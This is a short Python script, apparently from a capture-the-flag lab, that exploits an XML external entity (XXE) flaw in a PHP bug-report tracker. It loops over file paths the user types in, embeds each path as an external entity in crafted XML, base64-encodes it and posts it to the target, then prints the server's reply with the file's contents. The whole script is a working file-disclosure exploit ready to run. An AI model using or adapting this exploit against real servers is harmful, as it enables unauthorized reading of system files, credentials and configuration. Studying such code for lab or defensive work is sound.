import base64 as b64
import requests as rq

url = 'http://10.129.196.115/tracker_diRbPr00f314.php'

def encode(data):
	data = b64.b64encode(data)
	return data

def send(data):
	data = encode(data)
	res = rq.post(url, data={'data': data})
	print(res.text)
	return res

while True:
	f = input('File to read: ')
	data = f'''<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "{f}"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>"'</cwe>
		<cvss>"'</cvss>
		<reward>"'</reward>
		</bugreport>'''.encode('utf-8')
	send(data)
